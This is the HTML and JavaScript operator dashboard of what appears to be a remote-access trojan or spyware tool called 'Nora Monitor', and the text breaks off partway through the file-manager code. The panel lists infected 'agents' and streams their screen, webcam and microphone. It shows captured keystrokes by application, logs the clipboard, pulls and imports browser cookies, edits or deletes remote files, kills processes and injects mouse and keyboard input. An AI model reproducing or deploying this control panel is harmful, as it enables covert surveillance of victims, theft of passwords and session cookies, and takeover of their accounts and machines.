<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Nora Monitor</title>
<style>
/* ── Reset & tokens ─────────────────────────────────────── */
*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
:root {
  --sidebar-w: 220px;
  --hdr-h: 56px;
  --bg: #0e1117;
  --surface: #161b27;
  --surface2: #1e2538;
  --border: #252d3d;
  --accent: #4f8ef7;
  --accent-glow: rgba(79,142,247,.18);
  --green: #2dd4a0;
  --red: #f5585a;
  --yellow: #f5c842;
  --purple: #a78bfa;
  --text: #e2e8f4;
  --muted: #64748b;
  --muted2: #8897b0;
  --radius: 10px;
  --shadow: 0 2px 12px rgba(0,0,0,.5);
}
html, body { height: 100%; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
body { background: var(--bg); color: var(--text); display: flex; flex-direction: column; font-size: 14px; }

/* ── Top bar ────────────────────────────────────────────── */
#topbar {
  height: var(--hdr-h);
  background: var(--surface);
  border-bottom: 1px solid var(--border);
  display: flex; align-items: center; gap: 12px;
  padding: 0 20px;
  flex-shrink: 0;
  z-index: 100;
}
#topbar .logo { font-weight: 800; font-size: 1.1rem; letter-spacing: -.03em; color: var(--accent); }
#topbar .logo span { color: var(--text); opacity: .5; }
#status-pill {
  display: flex; align-items: center; gap: 6px;
  background: var(--surface2); border: 1px solid var(--border);
  border-radius: 999px; padding: 4px 12px;
  font-size: .78rem; color: var(--muted2);
}
#status-dot { width: 7px; height: 7px; border-radius: 50%; background: var(--muted); transition: background .3s; }
#status-dot.live { background: var(--green); box-shadow: 0 0 6px var(--green); }
#agent-select {
  margin-left: auto;
  background: var(--surface2); border: 1px solid var(--border);
  color: var(--text); border-radius: 8px;
  padding: 6px 10px; font-size: .82rem; cursor: pointer; outline: none;
}
#fps-badge {
  font-size: .72rem; color: var(--muted); background: var(--surface2);
  border: 1px solid var(--border); border-radius: 6px; padding: 3px 8px;
}

/* ── Layout ─────────────────────────────────────────────── */
#shell { display: flex; flex: 1; overflow: hidden; }

/* ── Sidebar ────────────────────────────────────────────── */
#sidebar {
  width: var(--sidebar-w); flex-shrink: 0;
  background: var(--surface);
  border-right: 1px solid var(--border);
  display: flex; flex-direction: column;
  overflow-y: auto;
}
.nav-section { padding: 16px 10px 4px; }
.nav-label { font-size: .65rem; text-transform: uppercase; letter-spacing: .1em; color: var(--muted); padding: 0 8px 6px; }
.nav-btn {
  display: flex; align-items: center; gap: 9px;
  width: 100%; padding: 9px 12px;
  background: none; border: none; border-radius: 8px;
  color: var(--muted2); font-size: .85rem; cursor: pointer;
  text-align: left; transition: background .15s, color .15s;
}
.nav-btn:hover { background: var(--surface2); color: var(--text); }
.nav-btn.active { background: var(--accent-glow); color: var(--accent); font-weight: 600; }
.nav-btn .icon { font-size: 1rem; width: 20px; text-align: center; }

/* ── Main content ───────────────────────────────────────── */
#main { flex: 1; overflow: hidden; display: flex; flex-direction: column; }

/* ── Panels ─────────────────────────────────────────────── */
.panel { display: none; flex: 1; overflow: hidden; flex-direction: column; }
.panel.active { display: flex; }
.panel-header {
  padding: 16px 20px 12px;
  border-bottom: 1px solid var(--border);
  flex-shrink: 0;
  display: flex; align-items: center; gap: 10px;
}
.panel-header h2 { font-size: .95rem; font-weight: 700; }
.panel-header .ph-meta { font-size: .75rem; color: var(--muted); margin-left: auto; }
.panel-body { flex: 1; overflow-y: auto; padding: 16px 20px; }

/* ── Screen panel ───────────────────────────────────────── */
#screen-wrap {
  flex: 1; overflow: hidden;
  display: flex; align-items: center; justify-content: center;
  background: #000; position: relative;
}
#screen-canvas {
  max-width: 100%; max-height: 100%;
  display: block; cursor: crosshair;
  image-rendering: auto;
}
#screen-overlay {
  position: absolute; top: 8px; right: 8px;
  display: flex; gap: 6px;
}
.screen-btn {
  background: rgba(0,0,0,.6); border: 1px solid rgba(255,255,255,.15);
  color: #fff; border-radius: 6px; padding: 5px 10px;
  font-size: .75rem; cursor: pointer;
}
.screen-btn:hover { background: rgba(255,255,255,.12); }
#remote-kb {
  background: var(--surface); border-top: 1px solid var(--border);
  padding: 10px 16px; display: flex; gap: 8px; flex-shrink: 0;
}
#remote-kb input {
  flex: 1; background: var(--surface2); border: 1px solid var(--border);
  color: var(--text); border-radius: 8px; padding: 8px 12px; font-size: .85rem;
  outline: none;
}
#remote-kb input:focus { border-color: var(--accent); }
#remote-kb button {
  background: var(--accent); border: none; color: #fff;
  border-radius: 8px; padding: 8px 14px; font-size: .82rem; cursor: pointer;
  font-weight: 600;
}
#desktop-ctrl {
  background: var(--surface); border-top: 1px solid var(--border);
  padding: 8px 16px; display: flex; gap: 6px; flex-shrink: 0; flex-wrap: wrap;
}
.ctrl-btn {
  background: var(--surface2); border: 1px solid var(--border);
  color: var(--text); border-radius: 7px; padding: 5px 12px;
  font-size: .78rem; cursor: pointer;
}
.ctrl-btn:hover { border-color: var(--accent); color: var(--accent); }

/* ── Keylog panel ───────────────────────────────────────── */
#kl-toolbar {
  padding: 10px 20px;
  display: flex; gap: 8px; align-items: center;
  border-bottom: 1px solid var(--border);
  flex-shrink: 0;
}
#kl-toolbar button {
  background: var(--surface2); border: 1px solid var(--border);
  color: var(--text); border-radius: 7px;
  padding: 6px 14px; font-size: .8rem; cursor: pointer;
}
#kl-toolbar button:hover { border-color: var(--accent); color: var(--accent); }
#kl-toolbar button.danger:hover { border-color: var(--red); color: var(--red); }
#kl-export-link {
  margin-left: auto;
  background: var(--accent); color: #fff; border: none;
  border-radius: 7px; padding: 6px 14px; font-size: .8rem;
  cursor: pointer; font-weight: 600; text-decoration: none;
  display: flex; align-items: center; gap: 5px;
}
#kl-export-link:hover { opacity: .85; }
#kl-feed { flex: 1; overflow-y: auto; padding: 12px 20px; font-family: "SF Mono","Fira Code",monospace; font-size: .82rem; }
.kl-app-block { margin-bottom: 4px; }
.kl-app-hdr {
  display: flex; align-items: center; gap: 8px;
  padding: 6px 10px 4px;
  color: var(--accent); font-size: .75rem; font-weight: 700;
  border-left: 3px solid var(--accent);
  margin-bottom: 2px;
}
.kl-app-hdr .app-time { color: var(--muted); font-weight: 400; margin-left: auto; font-size: .7rem; }
.kl-line { padding: 2px 10px 2px 13px; color: var(--text); line-height: 1.7; word-break: break-all; }
.kl-bs { color: var(--red); }
.kl-sp { color: var(--purple); }
.kl-ts { color: var(--muted); font-size: .7rem; margin-right: 6px; }

/* ── Camera panel ───────────────────────────────────────── */
#cam-wrap {
  flex: 1; display: flex; align-items: center; justify-content: center;
  background: #000;
}
#cam-img { max-width: 100%; max-height: 100%; object-fit: contain; }
#cam-ctrl {
  background: var(--surface); border-top: 1px solid var(--border);
  padding: 10px 16px; display: flex; gap: 8px; flex-shrink: 0;
}
.toggle-btn {
  background: var(--surface2); border: 1px solid var(--border);
  color: var(--text); border-radius: 8px; padding: 7px 16px;
  font-size: .82rem; cursor: pointer; font-weight: 600;
}
.toggle-btn.on { background: var(--accent-glow); border-color: var(--accent); color: var(--accent); }

/* ── Microphone ─────────────────────────────────────────── */
#mic-panel .panel-body { display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 16px; }
#mic-vis {
  width: 120px; height: 120px; border-radius: 50%;
  border: 3px solid var(--border);
  display: flex; align-items: center; justify-content: center;
  font-size: 2.5rem;
  background: var(--surface2);
  transition: border-color .3s, box-shadow .3s;
}
#mic-vis.active { border-color: var(--red); box-shadow: 0 0 24px rgba(245,88,90,.3); }
#mic-label { color: var(--muted); font-size: .9rem; }

/* ── Processes ──────────────────────────────────────────── */
#proc-toolbar {
  padding: 10px 20px; border-bottom: 1px solid var(--border);
  display: flex; gap: 8px; flex-shrink: 0;
}
#proc-search {
  flex: 1; background: var(--surface2); border: 1px solid var(--border);
  color: var(--text); border-radius: 8px; padding: 7px 12px; font-size: .82rem; outline: none;
}
#proc-search:focus { border-color: var(--accent); }
#proc-refresh {
  background: var(--surface2); border: 1px solid var(--border);
  color: var(--text); border-radius: 8px; padding: 7px 12px;
  font-size: .82rem; cursor: pointer;
}
#proc-list { flex: 1; overflow-y: auto; }
.proc-row {
  display: flex; align-items: center; gap: 10px;
  padding: 8px 20px; border-bottom: 1px solid var(--border);
  transition: background .12s;
}
.proc-row:hover { background: var(--surface2); }
.proc-name { flex: 1; font-size: .83rem; font-weight: 500; }
.proc-pid { color: var(--muted); font-size: .75rem; width: 50px; text-align: right; }
.proc-cpu { color: var(--muted2); font-size: .75rem; width: 56px; text-align: right; }
.proc-mem { color: var(--muted2); font-size: .75rem; width: 64px; text-align: right; }
.proc-kill {
  background: none; border: 1px solid var(--border);
  color: var(--red); border-radius: 6px; padding: 3px 9px;
  font-size: .72rem; cursor: pointer;
}
.proc-kill:hover { background: rgba(245,88,90,.12); }

/* ── File Manager ───────────────────────────────────────── */
#fm-path-bar {
  padding: 10px 20px; border-bottom: 1px solid var(--border);
  display: flex; gap: 8px; flex-shrink: 0;
}
#fm-path {
  flex: 1; background: var(--surface2); border: 1px solid var(--border);
  color: var(--text); border-radius: 8px; padding: 7px 12px; font-size: .82rem;
  outline: none; font-family: monospace;
}
#fm-path:focus { border-color: var(--accent); }
#fm-go {
  background: var(--accent); border: none; color: #fff;
  border-radius: 8px; padding: 7px 14px; font-size: .82rem; cursor: pointer;
}
#fm-list { flex: 1; overflow-y: auto; }
.fm-row {
  display: flex; align-items: center; gap: 10px;
  padding: 8px 20px; border-bottom: 1px solid var(--border);
  cursor: pointer; transition: background .12s;
}
.fm-row:hover { background: var(--surface2); }
.fm-icon { width: 20px; text-align: center; font-size: 1rem; }
.fm-name { flex: 1; font-size: .83rem; }
.fm-size { color: var(--muted); font-size: .75rem; }
.fm-del {
  background: none; border: 1px solid var(--border);
  color: var(--red); border-radius: 6px; padding: 3px 9px;
  font-size: .72rem; cursor: pointer;
}
.fm-del:hover { background: rgba(245,88,90,.12); }
#fm-editor {
  background: var(--surface); border-top: 1px solid var(--border);
  padding: 12px 20px; flex-shrink: 0; display: none; flex-direction: column; gap: 8px;
}
#fm-editor.show { display: flex; }
#fm-editor-path { font-size: .75rem; color: var(--muted); font-family: monospace; }
#fm-textarea {
  background: var(--surface2); border: 1px solid var(--border);
  color: var(--text); border-radius: 8px; padding: 10px 12px;
  font-family: monospace; font-size: .82rem;
  resize: vertical; min-height: 140px; outline: none;
}
#fm-textarea:focus { border-color: var(--accent); }
#fm-save, #fm-download {
  background: var(--accent); border: none; color: #fff;
  border-radius: 8px; padding: 7px 16px; font-size: .82rem; cursor: pointer;
}
#fm-download { background: var(--surface2); border: 1px solid var(--border); color: var(--text); }

/* ── Cookies ────────────────────────────────────────────── */
#cookie-panel .panel-body { display: flex; flex-direction: column; gap: 12px; }
.big-btn {
  background: var(--surface2); border: 1px solid var(--border);
  color: var(--text); border-radius: 10px;
  padding: 14px 20px; font-size: .9rem; cursor: pointer;
  text-align: left; transition: border-color .15s;
  display: flex; align-items: center; gap: 12px;
  width: 100%;
}
.big-btn:hover { border-color: var(--accent); }
.big-btn .bicon { font-size: 1.4rem; }
.big-btn .binfo strong { display: block; font-weight: 700; }
.big-btn .binfo span { color: var(--muted); font-size: .78rem; }
#cookie-status { padding: 10px 14px; background: var(--surface2); border-radius: 8px; font-size: .82rem; color: var(--muted2); min-height: 40px; }

/* ── Recording ──────────────────────────────────────────── */
#rec-panel .panel-body { display: flex; flex-direction: column; align-items: center; gap: 16px; }
#rec-indicator {
  width: 80px; height: 80px; border-radius: 50%;
  background: var(--surface2); border: 3px solid var(--border);
  display: flex; align-items: center; justify-content: center;
  font-size: 2rem; transition: border-color .3s, box-shadow .3s;
}
#rec-indicator.recording { border-color: var(--red); box-shadow: 0 0 20px rgba(245,88,90,.4); animation: pulse 1s ease-in-out infinite; }
@keyframes pulse { 0%,100%{box-shadow:0 0 16px rgba(245,88,90,.35)} 50%{box-shadow:0 0 32px rgba(245,88,90,.6)} }
#rec-label { color: var(--muted); }
#rec-btn {
  background: var(--accent); border: none; color: #fff;
  border-radius: 10px; padding: 10px 28px; font-size: .9rem; cursor: pointer; font-weight: 700;
}
#rec-btn.stop { background: var(--red); }

/* ── Clipboard ──────────────────────────────────────────── */
#clip-list { flex: 1; overflow-y: auto; display: flex; flex-direction: column; gap: 8px; padding: 16px 20px; }
.clip-item {
  background: var(--surface2); border: 1px solid var(--border);
  border-radius: 8px; padding: 10px 14px;
  font-size: .82rem; word-break: break-all;
}
.clip-ts { color: var(--muted); font-size: .7rem; margin-top: 4px; }

/* ── Toast ──────────────────────────────────────────────── */
#toast-wrap { position: fixed; bottom: 20px; right: 20px; display: flex; flex-direction: column-reverse; gap: 8px; z-index: 9999; }
.toast {
  background: var(--surface2); border: 1px solid var(--border);
  border-radius: 8px; padding: 10px 16px;
  font-size: .8rem; color: var(--text);
  box-shadow: var(--shadow); max-width: 320px;
  animation: slideIn .2s ease;
}
@keyframes slideIn { from{opacity:0;transform:translateX(20px)} to{opacity:1;transform:none} }
.toast.success { border-color: var(--green); }
.toast.error   { border-color: var(--red); }

/* ── Scrollbars ─────────────────────────────────────────── */
::-webkit-scrollbar { width: 5px; height: 5px; }
::-webkit-scrollbar-track { background: transparent; }
::-webkit-scrollbar-thumb { background: var(--border); border-radius: 999px; }

/* ── Responsive ─────────────────────────────────────────── */
@media (max-width: 700px) {
  :root { --sidebar-w: 52px; }
  .nav-btn span:not(.icon) { display: none; }
  .nav-label { display: none; }
  #topbar .logo span { display: none; }
}
</style>
</head>
<body>

<!-- TOP BAR -->
<div id="topbar">
  <div class="logo">Nora<span>Monitor</span></div>
  <div id="status-pill">
    <div id="status-dot"></div>
    <span id="status-text">Connecting…</span>
  </div>
  <select id="agent-select"><option value="">— select agent —</option></select>
  <div id="fps-badge">— fps</div>
</div>

<!-- SHELL -->
<div id="shell">

  <!-- SIDEBAR -->
  <nav id="sidebar">
    <div class="nav-section">
      <div class="nav-label">Monitor</div>
      <button class="nav-btn active" data-panel="screen-panel"><span class="icon">🖥</span><span>Screen</span></button>
      <button class="nav-btn" data-panel="cam-panel"><span class="icon">📷</span><span>Camera</span></button>
      <button class="nav-btn" data-panel="mic-panel"><span class="icon">🎙</span><span>Microphone</span></button>
      <button class="nav-btn" data-panel="clip-panel"><span class="icon">📋</span><span>Clipboard</span></button>
    </div>
    <div class="nav-section">
      <div class="nav-label">Data</div>
      <button class="nav-btn" data-panel="kl-panel"><span class="icon">⌨</span><span>Keylogs</span></button>
      <button class="nav-btn" data-panel="cookie-panel"><span class="icon">🍪</span><span>Cookies</span></button>
      <button class="nav-btn" data-panel="fm-panel"><span class="icon">📁</span><span>Files</span></button>
    </div>
    <div class="nav-section">
      <div class="nav-label">System</div>
      <button class="nav-btn" data-panel="proc-panel"><span class="icon">⚙</span><span>Processes</span></button>
      <button class="nav-btn" data-panel="rec-panel"><span class="icon">⏺</span><span>Recording</span></button>
    </div>
  </nav>

  <!-- MAIN -->
  <div id="main">

    <!-- SCREEN -->
    <div class="panel active" id="screen-panel">
      <div id="screen-wrap">
        <canvas id="screen-canvas"></canvas>
        <div id="screen-overlay">
          <button class="screen-btn" id="fs-btn">⛶ Fullscreen</button>
        </div>
      </div>
      <div id="desktop-ctrl">
        <span style="color:var(--muted);font-size:.75rem;align-self:center">Desktop:</span>
        <button class="ctrl-btn" data-dcmd="new">+ New</button>
        <button class="ctrl-btn" data-dcmd="left">← Left</button>
        <button class="ctrl-btn" data-dcmd="right">Right →</button>
        <button class="ctrl-btn" data-dcmd="close">✕ Close</button>
      </div>
      <div id="remote-kb">
        <input id="kb-input" type="text" placeholder="Type here to send keys to the remote PC…">
        <button id="kb-send">Send</button>
      </div>
    </div>

    <!-- CAMERA -->
    <div class="panel" id="cam-panel">
      <div class="panel-header">
        <h2>Camera</h2>
        <button class="toggle-btn" id="cam-toggle">▶ Start</button>
      </div>
      <div id="cam-wrap"><img id="cam-img" src="" alt="Camera off"></div>
    </div>

    <!-- MICROPHONE -->
    <div class="panel" id="mic-panel">
      <div class="panel-header"><h2>Microphone</h2></div>
      <div class="panel-body">
        <div id="mic-vis">🎙</div>
        <div id="mic-label">Microphone is off</div>
        <button class="toggle-btn" id="mic-toggle">▶ Start</button>
      </div>
    </div>

    <!-- CLIPBOARD -->
    <div class="panel" id="clip-panel">
      <div class="panel-header"><h2>Clipboard</h2><span class="ph-meta" id="clip-count">0 entries</span></div>
      <div id="clip-list"></div>
    </div>

    <!-- KEYLOGS -->
    <div class="panel" id="kl-panel">
      <div class="panel-header"><h2>Keylogs</h2><span class="ph-meta" id="kl-count">0 keys</span></div>
      <div id="kl-toolbar">
        <button id="kl-clear" class="danger">🗑 Clear view</button>
        <a id="kl-export-link" href="#" target="_blank">⬇ Export HTML Report</a>
      </div>
      <div id="kl-feed"></div>
    </div>

    <!-- COOKIES -->
    <div class="panel" id="cookie-panel">
      <div class="panel-header"><h2>Cookies</h2></div>
      <div class="panel-body">
        <button class="big-btn" id="btn-export-cookies">
          <span class="bicon">📤</span>
          <div class="binfo"><strong>Export Cookies</strong><span>Pull all browser cookies from the agent</span></div>
        </button>
        <button class="big-btn" id="btn-import-cookies">
          <span class="bicon">📥</span>
          <div class="binfo"><strong>Import Cookies</strong><span>Push a previously exported cookie set</span></div>
        </button>
        <div id="cookie-status">Ready.</div>
      </div>
    </div>

    <!-- FILES -->
    <div class="panel" id="fm-panel">
      <div class="panel-header"><h2>File Manager</h2>
        <label id="fm-upload-btn" style="margin-left:auto;background:var(--accent);color:#fff;border-radius:7px;padding:6px 14px;font-size:.8rem;cursor:pointer;font-weight:600;">⬆ Upload</label>
        <input id="fm-upload-input" type="file" style="display:none">
      </div>
      <div id="fm-path-bar">
        <input id="fm-path" type="text" placeholder="Remote path…">
        <button id="fm-go">Go</button>
      </div>
      <div id="fm-list"></div>
      <div id="fm-editor">
        <div id="fm-editor-path"></div>
        <textarea id="fm-textarea"></textarea>
        <div style="display:flex;gap:8px;justify-content:flex-end">
          <button id="fm-download">⬇ Download</button>
          <button id="fm-save">Save File</button>
        </div>
      </div>
    </div>

    <!-- PROCESSES -->
    <div class="panel" id="proc-panel">
      <div class="panel-header"><h2>Processes</h2><span class="ph-meta" id="proc-count">—</span></div>
      <div id="proc-toolbar">
        <input id="proc-search" type="text" placeholder="Filter by name or PID…">
        <button id="proc-refresh">↺ Refresh</button>
      </div>
      <div id="proc-list"></div>
    </div>

    <!-- RECORDING -->
    <div class="panel" id="rec-panel">
      <div class="panel-header"><h2>Screen Recording</h2></div>
      <div class="panel-body">
        <div id="rec-indicator">⏺</div>
        <div id="rec-label">Not recording</div>
        <button id="rec-btn">Start Recording</button>
      </div>
    </div>

  </div><!-- /main -->
</div><!-- /shell -->

<div id="toast-wrap"></div>

<script src="https://cdn.jsdelivr.net/npm/socket.io-client@4.7.5/dist/socket.io.min.js"></script>
<script>
/* ── Utilities ──────────────────────────────────────────── */
function toast(msg, type) {
  const el = document.createElement("div");
  el.className = "toast" + (type ? " " + type : "");
  el.textContent = msg;
  document.getElementById("toast-wrap").prepend(el);
  setTimeout(() => el.remove(), 4000);
}
function fmtBytes(b) {
  if (b < 1024) return b + " B";
  if (b < 1048576) return (b/1024).toFixed(1) + " KB";
  return (b/1048576).toFixed(1) + " MB";
}
function esc(s) {
  return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");
}

/* ── Navigation ─────────────────────────────────────────── */
document.querySelectorAll(".nav-btn").forEach(btn => {
  btn.addEventListener("click", () => {
    document.querySelectorAll(".nav-btn").forEach(b => b.classList.remove("active"));
    document.querySelectorAll(".panel").forEach(p => p.classList.remove("active"));
    btn.classList.add("active");
    document.getElementById(btn.dataset.panel).classList.add("active");
    if (btn.dataset.panel === "proc-panel" && currentAgent) reqProcesses();
  });
});

/* ── Socket.IO ──────────────────────────────────────────── */
const socket = io({ transports: ["websocket", "polling"] });
let currentAgent = "";
let _exportedCookies = null;

const statusDot  = document.getElementById("status-dot");
const statusText = document.getElementById("status-text");
const agentSel   = document.getElementById("agent-select");
const fpsBadge   = document.getElementById("fps-badge");

socket.on("connect", () => {
  statusDot.classList.add("live");
  statusText.textContent = "Connected";
  socket.emit("hub_join");
});
socket.on("disconnect", () => {
  statusDot.classList.remove("live");
  statusText.textContent = "Disconnected";
});

socket.on("agent_list", agents => {
  const prev = agentSel.value;
  agentSel.innerHTML = '<option value="">— select agent —</option>';
  agents.forEach(a => {
    const opt = document.createElement("option");
    opt.value = opt.textContent = a.name;
    agentSel.appendChild(opt);
  });
  if (prev && agents.find(a => a.name === prev)) {
    agentSel.value = prev;
  } else if (agents.length === 1) {
    agentSel.value = agents[0].name;
    currentAgent = agents[0].name;
    updateExportLink();
  }
});

agentSel.addEventListener("change", () => {
  currentAgent = agentSel.value;
  updateExportLink();
});

/* ── FPS ─────────────────────────────────────────────────── */
let _fpsN = 0, _fpsSec = Date.now();
function tickFps() {
  _fpsN++;
  const now = Date.now();
  if (now - _fpsSec >= 1000) {
    fpsBadge.textContent = _fpsN + " fps";
    _fpsN = 0; _fpsSec = now;
  }
}

/* ── Screen (canvas for flicker-free rendering) ──────────── */
const screenCanvas = document.getElementById("screen-canvas");
const screenCtx    = screenCanvas.getContext("2d");
let _pendingFrame  = null;
let _rafPending    = false;

function _drawPending() {
  _rafPending = false;
  if (!_pendingFrame) return;
  const img = _pendingFrame; _pendingFrame = null;
  if (screenCanvas.width !== img.naturalWidth)  screenCanvas.width  = img.naturalWidth;
  if (screenCanvas.height !== img.naturalHeight) screenCanvas.height = img.naturalHeight;
  screenCtx.drawImage(img, 0, 0);
}

socket.on("frame", d => {
  if (d._agent !== currentAgent) return;
  tickFps();
  const img = new Image();
  img.onload = () => {
    _pendingFrame = img;
    if (!_rafPending) { _rafPending = true; requestAnimationFrame(_drawPending); }
  };
  img.src = "data:image/jpeg;base64," + d.data;
});

function _screenPos(e) {
  const r = screenCanvas.getBoundingClientRect();
  return { x:(e.clientX-r.left)/r.width, y:(e.clientY-r.top)/r.height };
}
screenCanvas.addEventListener("click", e => {
  if (!currentAgent) return;
  const {x,y} = _screenPos(e);
  socket.emit("command", { action:"mouse_click", x, y, _target:currentAgent });
});
screenCanvas.addEventListener("contextmenu", e => {
  e.preventDefault();
  if (!currentAgent) return;
  const {x,y} = _screenPos(e);
  socket.emit("command", { action:"mouse_right", x, y, _target:currentAgent });
});
screenCanvas.addEventListener("wheel", e => {
  e.preventDefault();
  if (!currentAgent) return;
  socket.emit("command", { action:"scroll", dy:e.deltaY>0?3:-3, _target:currentAgent });
}, { passive:false });

document.getElementById("fs-btn").addEventListener("click", () => {
  const w = document.getElementById("screen-wrap");
  document.fullscreenElement ? document.exitFullscreen() : w.requestFullscreen?.();
});

document.querySelectorAll("[data-dcmd]").forEach(btn => {
  btn.addEventListener("click", () => {
    if (!currentAgent) return;
    socket.emit("desktop_cmd", { cmd:btn.dataset.dcmd, _target:currentAgent });
  });
});

const kbInput = document.getElementById("kb-input");
document.getElementById("kb-send").addEventListener("click", () => {
  const text = kbInput.value;
  if (!text || !currentAgent) return;
  socket.emit("command", { action:"type", text, _target:currentAgent });
  kbInput.value = "";
});
kbInput.addEventListener("keydown", e => { if (e.key === "Enter") document.getElementById("kb-send").click(); });

/* ── Keylogs ─────────────────────────────────────────────── */
let klKeyCount = 0, klCurrentApp = "", klCurrentLine = null, klCurrentBlock = null;
const klFeed = document.getElementById("kl-feed");
const klCount = document.getElementById("kl-count");

socket.on("key", d => {
  if (d._agent && d._agent !== currentAgent) return;
  klKeyCount++;
  klCount.textContent = klKeyCount + " keys";
  const app = d.app || "Unknown";
  const ch  = d.char || "";
  const ts  = d.time || "";

  if (app !== klCurrentApp) {
    klCurrentApp = app;
    klCurrentLine = null;
    const parts = app.split(" — ");
    const block = document.createElement("div");
    block.className = "kl-app-block";
    block.innerHTML = `<div class="kl-app-hdr"><span>${esc(parts[0])}</span>${parts[1]?`<span style="color:var(--muted);font-weight:400"> — ${esc(parts[1])}</span>`:""}<span class="app-time">${esc(ts)}</span></div>`;
    klCurrentBlock = block;
    klFeed.appendChild(block);
  }

  if (!klCurrentLine) {
    klCurrentLine = document.createElement("div");
    klCurrentLine.className = "kl-line";
    klCurrentLine.innerHTML = `<span class="kl-ts">${esc(ts)}</span>`;
    klCurrentBlock.appendChild(klCurrentLine);
  }

  let span;
  if (ch === "⌫") span = `<span class="kl-bs">⌫</span>`;
  else if (ch === "↵") { klCurrentLine = null; return; }
  else if (["⇥","⎋","⌦","⇞","⇟","↑","↓","←","→"].includes(ch)) span = `<span class="kl-sp">${esc(ch)}</span>`;
  else span = esc(ch);

  klCurrentLine.innerHTML += span;
  if (klFeed.scrollTop + klFeed.clientHeight > klFeed.scrollHeight - 80)
    klFeed.scrollTop = klFeed.scrollHeight;
});

document.getElementById("kl-clear").addEventListener("click", () => {
  klFeed.innerHTML = "";
  klKeyCount = 0; klCurrentApp = ""; klCurrentLine = null; klCurrentBlock = null;
  klCount.textContent = "0 keys";
});

function updateExportLink() {
  const link = document.getElementById("kl-export-link");
  if (currentAgent) {
    link.href = "/keylogs/" + encodeURIComponent(currentAgent);
    link.style.opacity = "1"; link.style.pointerEvents = "";
  } else {
    link.href = "#"; link.style.opacity = ".4"; link.style.pointerEvents = "none";
  }
}
updateExportLink();

/* ── Camera ──────────────────────────────────────────────── */
const camImg = document.getElementById("cam-img");
let camOn = false;
socket.on("camera_frame", d => {
  if (d._agent !== currentAgent) return;
  camImg.src = "data:image/jpeg;base64," + d.data;
});
document.getElementById("cam-toggle").addEventListener("click", function() {
  if (!currentAgent) return;
  camOn = !camOn;
  socket.emit(camOn ? "camera_on" : "camera_off", { _target:currentAgent });
  this.textContent = camOn ? "⏹ Stop" : "▶ Start";
  this.classList.toggle("on", camOn);
});

/* ── Microphone + Audio playback ─────────────────────────── */
let micOn = false;
let _audioCtx = null;
let _nextPlayAt = 0;
const SAMPLE_RATE = 16000;

function _getAudioCtx() {
  if (!_audioCtx || _audioCtx.state === "closed") {
    _audioCtx = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: SAMPLE_RATE });
    _nextPlayAt = 0;
  }
  if (_audioCtx.state === "suspended") _audioCtx.resume();
  return _audioCtx;
}

socket.on("audio", d => {
  if (!micOn) return;
  // Only filter by agent if both sides are known; never drop when uncertain
  if (currentAgent && d._agent && d._agent !== currentAgent) return;
  try {
    const ctx = _getAudioCtx();
    // Decode base64 → Int16 PCM → Float32
    const raw = atob(d.data);
    const int16 = new Int16Array(raw.length / 2);
    for (let i = 0; i < int16.length; i++)
      int16[i] = (raw.charCodeAt(i*2)) | (raw.charCodeAt(i*2+1) << 8);
    const float32 = new Float32Array(int16.length);
    for (let i = 0; i < int16.length; i++) float32[i] = int16[i] / 32768;

    const buf = ctx.createBuffer(1, float32.length, SAMPLE_RATE);
    buf.copyToChannel(float32, 0);

    const src = ctx.createBufferSource();
    src.buffer = buf;
    src.connect(ctx.destination);

    // Schedule back-to-back; 80ms jitter buffer on first chunk
    const now = ctx.currentTime;
    if (_nextPlayAt < now + 0.01) _nextPlayAt = now + 0.08;
    src.start(_nextPlayAt);
    _nextPlayAt += buf.duration;
  } catch(e) { console.warn("audio playback:", e); }
});

document.getElementById("mic-toggle").addEventListener("click", function() {
  if (!currentAgent) return;
  micOn = !micOn;
  socket.emit(micOn ? "mic_on" : "mic_off", { _target:currentAgent });
  this.textContent = micOn ? "⏹ Stop" : "▶ Start";
  this.classList.toggle("on", micOn);
  document.getElementById("mic-vis").classList.toggle("active", micOn);
  document.getElementById("mic-label").textContent = micOn ? "Microphone is live…" : "Microphone is off";
  if (micOn) _getAudioCtx(); // unlock audio context on user gesture
  else if (_audioCtx) { _audioCtx.close(); _audioCtx = null; }
});

/* ── Clipboard ───────────────────────────────────────────── */
let clipCount = 0;
socket.on("clipboard", d => {
  if (d._agent !== currentAgent) return;
  clipCount++;
  document.getElementById("clip-count").textContent = clipCount + " entries";
  const el = document.createElement("div");
  el.className = "clip-item";
  el.innerHTML = `<div>${esc(d.text)}</div><div class="clip-ts">${new Date().toLocaleTimeString()}</div>`;
  document.getElementById("clip-list").prepend(el);
});

/* ── Processes ───────────────────────────────────────────── */
let _allProcs = [];
const procSearch = document.getElementById("proc-search");
const procList   = document.getElementById("proc-list");

function reqProcesses() {
  if (!currentAgent) return;
  socket.emit("get_processes", { _target:currentAgent });
}
document.getElementById("proc-refresh").addEventListener("click", reqProcesses);
procSearch.addEventListener("input", renderProcs);

socket.on("processes_result", d => {
  _allProcs = d.processes || [];
  document.getElementById("proc-count").textContent = _allProcs.length + " processes";
  renderProcs();
});

function renderProcs() {
  const q = procSearch.value.toLowerCase();
  const list = q ? _allProcs.filter(p => (p.name||"").toLowerCase().includes(q)||String(p.pid).includes(q)) : _allProcs;
  procList.innerHTML = "";
  list.forEach(p => {
    const row = document.createElement("div");
    row.className = "proc-row";
    row.innerHTML = `<div class="proc-name">${esc(p.name||"?")}</div><div class="proc-pid">${p.pid}</div><div class="proc-cpu">${(p.cpu||0).toFixed(1)}%</div><div class="proc-mem">${fmtBytes((p.mem||0)*1024)}</div><button class="proc-kill" data-pid="${p.pid}">Kill</button>`;
    procList.appendChild(row);
  });
  procList.querySelectorAll(".proc-kill").forEach(btn => {
    btn.addEventListener("click", () => {
      socket.emit("kill_process", { pid:parseInt(btn.dataset.pid), _target:currentAgent });
      setTimeout(reqProcesses, 800);
    });
  });
}

/* ── File Manager ────────────────────────────────────────── */
const fmPath   = document.getElementById("fm-path");
const fmList   = document.getElementById("fm-list");
const fmEditor = document.getElementById("fm-editor");
let _editingPath = "", _editingB64 = "";

document.getElementById("fm-go").addEventListener("click", () => {
  if (!currentAgent) return;
  socket.emit("list_dir", { path:fmPath.value, _target:currentAgent });
